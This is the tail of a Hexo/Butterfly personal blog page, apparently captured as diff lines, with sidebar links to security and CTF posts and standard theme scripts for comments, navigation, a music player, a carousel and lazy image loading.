data-original="https://external-preview.redd.it/e1vPmXFtQrlXfTyvRJ-J7CqaRWOVljVLAJtPcRxeR2c.jpg?auto=webp&amp;s=2a7bd02c4ee80268eb5a7f6e52b4080b5504a458" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="云安全：CICD靶场实操"/></a><div class="content"><a class="title" href="/2024/12/11/%E4%BA%91%E5%AE%89%E5%85%A8%EF%BC%9ACICD%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%93%8D/" title="云安全：CICD靶场实操">云安全：CICD靶场实操</a><time datetime="2024-12-11T07:34:52.000Z" title="Created 2024-12-11 15:34:52">2024-12-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/13/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/" title="靶场渗透">靶场渗透</a><time datetime="2024-09-13T07:50:26.000Z" title="Created 2024-09-13 15:50:26">2024-09-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/13/Reverse%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8C%97/" title="Reverse学习指北">Reverse学习指北</a><time datetime="2024-09-13T07:47:41.000Z" title="Created 2024-09-13 15:47:41">2024-09-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/02/%E9%85%8D%E7%BD%AE%E5%9C%BA%E6%99%AF2-0/" title="配置场景2.0"><img src="/img/motion.gif" data-original="https://seaside-station.com/wpbin/wp-content/uploads/shimonada_20.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="配置场景2.0"/></a><div class="content"><a class="title" href="/2024/08/02/%E9%85%8D%E7%BD%AE%E5%9C%BA%E6%99%AF2-0/" title="配置场景2.0">配置场景2.0</a><time datetime="2024-08-02T01:16:21.000Z" title="Created 2024-08-02 09:16:21">2024-08-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/26/%E9%85%8D%E7%BD%AE%E5%9C%BA%E6%99%AF%E8%AE%AD%E7%BB%83%E9%9B%86%E6%A1%88%E4%BE%8B/" title="配置场景指令类型训练集案例"><img src="/img/motion.gif" data-original="https://seaside-station.com/wpbin/wp-content/uploads/hitachi_25.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="配置场景指令类型训练集案例"/></a><div class="content"><a class="title" href="/2024/07/26/%E9%85%8D%E7%BD%AE%E5%9C%BA%E6%99%AF%E8%AE%AD%E7%BB%83%E9%9B%86%E6%A1%88%E4%BE%8B/" title="配置场景指令类型训练集案例">配置场景指令类型训练集案例</a><time datetime="2024-07-26T02:32:34.000Z" title="Created 2024-07-26 10:32:34">2024-07-26</time></div></div></div></div></div><div class="card-widget card-pixiv"><div class="card-content"><div class="item-headline"><i class="fa fa-image" aria-hidden="true"></i><span>Pixiv日榜Top50</span></div><iframe src="https://cloud.mokeyjay.com/pixiv" frameborder="0" style="width:99%;height:380px;margin:0;"></iframe></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;Tue Jul 11 2023 08:00:00 GMT+0800 (中国标准时间) - 2024 By Tardfyou</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div id="running-time"></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'ttVuIDH2duSGOGYZrRZIe8xY-gzGzoHsz',
+      appKey: 'VNobzgz4kT6B2u27zgoQj5sF',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: true
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'https://tardfyou.github.io/2024/12/11/%E4%BA%91%E5%AE%89%E5%85%A8%EF%BC%9ACICD%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%93%8D/'
+    this.page.identifier = '/2024/12/11/%E4%BA%91%E5%AE%89%E5%85%A8%EF%BC%9ACICD%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%93%8D/'
+    this.page.title = '云安全：CICD靶场实操'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script src="/js/ip_content.js"></script><script>setInterval(()=>{let create_time=Math.round(new Date("2020-3-21-20:14:00").getTime()/1000);let timestamp=Math.round((new Date().getTime()+8*60*60*1000)/1000);let second=timestamp-create_time;let time=new Array(0,0,0,0,0);if(second>=365*24*3600){time[0]=parseInt(second/(365*24*3600));second%=365*24*3600}if(second>=24*3600){time[1]=parseInt(second/(24*3600));second%=24*3600}if(second>=3600){time[2]=parseInt(second/3600);second%=3600}if(second>=60){time[3]=parseInt(second/60);second%=60}if(second>0){time[4]=second}currentTimeHtml='小破站已经安全运行 '+time[0]+' 年 '+time[1]+' 天 '+time[2]+' 时 '+time[3]+' 分 '+time[4]+' 秒';var elementById=document.getElementById('running-time');if(elementById){elementById.innerHTML=currentTimeHtml}},1000);</script><script src="/js/title.js"></script><script src="/js/Mobile_folding.js"></script><div class="aplayer no-destroy" data-id="1382576173" data-server="netease" data-type="song" data-fixed="true" data-autoplay="false" data-lrcType="-1"> </div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="true" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/06/01/AntiSword-Attack/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="/img/motion.gif" data-original="/images/AntiSword/umishibaura_16.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-06-01</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/06/01/AntiSword-Attack/&quot;);" href="javascript:void(0);" alt="">AntiSword Attack</a><div class="blog-slider__text">易直向前</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/06/01/AntiSword-Attack/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/08/02/配置场景2-0/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="/img/motion.gif" data-original="https://seaside-station.com/wpbin/wp-content/uploads/shimonada_20.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-08-02</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/08/02/配置场景2-0/&quot;);" href="javascript:void(0);" alt="">配置场景2.0</a><div class="blog-slider__text">学习与创新</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/08/02/配置场景2-0/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/07/26/配置场景训练集案例/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="/img/motion.gif" data-original="https://seaside-station.com/wpbin/wp-content/uploads/hitachi_25.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-07-26</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/07/26/配置场景训练集案例/&quot;);" href="javascript:void(0);" alt="">配置场景指令类型训练集案例</a><div class="blog-slider__text">学习与创新</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/07/26/配置场景训练集案例/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/07/26/业务场景问答实例/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="/img/motion.gif" data-original="https://seaside-station.com/wpbin/wp-content/uploads/hitachi_06.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-07-26</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/07/26/业务场景问答实例/&quot;);" href="javascript:void(0);" alt="">业务场景问答实例</a><div class="blog-slider__text">学习与创新</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/07/26/业务场景问答实例/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/07/23/运维模型语料库框架/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="/img/motion.gif" data-original="https://seaside-station.com/wpbin/wp-content/uploads/nebukawa_45.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-07-23</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/07/23/运维模型语料库框架/&quot;);" href="javascript:void(0);" alt="">运维模型语料库框架</a><div class="blog-slider__text">学习与创新</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/07/23/运维模型语料库框架/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/06/09/黑客道精神还是开源精神？/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="/img/motion.gif" data-original="https://seaside-station.com/wpbin/wp-content/uploads/aomi_01.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-06-09</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/06/09/黑客道精神还是开源精神？/&quot;);" href="javascript:void(0);" alt="">黑客道精神还是开源精神？</a><div class="blog-slider__text">继承与磨练</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/06/09/黑客道精神还是开源精神？/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/05/22/520晚上的攻防浪漫/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="/img/motion.gif" data-original="https://seaside-station.com/wpbin/wp-content/uploads/seihama_02.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-05-22</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/05/22/520晚上的攻防浪漫/&quot;);" href="javascript:void(0);" alt="">520和安全一同度过</a><div class="blog-slider__text">继承与磨练</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/05/22/520晚上的攻防浪漫/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/03/01/一次博客移植/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="/img/motion.gif" data-original="https://seaside-station.com/wpbin/wp-content/uploads/umishibaura_09.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-03-01</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/03/01/一次博客移植/&quot;);" href="javascript:void(0);" alt="">一次博客移植</a><div class="blog-slider__text">继承与磨练</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/03/01/一次博客移植/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2023/10/23/第一次Linux-Kernel的patch提交/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="/img/motion.gif" data-original="https://seaside-station.com/wpbin/wp-content/uploads/arimagawa_15.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2023-10-23</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2023/10/23/第一次Linux-Kernel的patch提交/&quot;);" href="javascript:void(0);" alt="">第一次Linux Kernel的patch提交</a><div class="blog-slider__text">久练则承</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2023/10/23/第一次Linux-Kernel的patch提交/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2023/07/11/启程/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="/img/motion.gif" data-original="https://i03piccdn.sogoucdn.com/37bf8ddad2be8d6b" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2023-07-11</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2023/07/11/启程/&quot;);" href="javascript:void(0);" alt="">启程</a><div class="blog-slider__text">上路！上路！</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2023/07/11/启程/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2023/07/14/游泳感悟/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="/img/motion.gif" data-original="https://i01piccdn.sogoucdn.com/ae51a21540a33b78" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2023-07-14</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2023/07/14/游泳感悟/&quot;);" href="javascript:void(0);" alt="">游泳感悟</a><div class="blog-slider__text">温柔也是一种力量</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2023/07/14/游泳感悟/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/12/11/云安全：CICD靶场实操/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="/img/motion.gif" data-original="https://external-preview.redd.it/e1vPmXFtQrlXfTyvRJ-J7CqaRWOVljVLAJtPcRxeR2c.jpg?auto=webp&amp;s=2a7bd02c4ee80268eb5a7f6e52b4080b5504a458" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-12-11</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/12/11/云安全：CICD靶场实操/&quot;);" href="javascript:void(0);" alt="">云安全：CICD靶场实操</a><div class="blog-slider__text">学校的云安全攻防课程结课了，大作业是从CICD-GOAT靶场找flag。本次拿下了靶场热门的11个flag，再次记录详细过程，以便后续学习。</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/12/11/云安全：CICD靶场实操/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><!-- hexo injector body_end end -->
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a,i=c[o];e=function(){c=c.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,a=t.getAttribute("data-original"),n.onload=function(){t.src=a,t.removeAttribute("data-original"),e&&e()},t.src!==a&&(n.src=a))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this);</script></body></html>
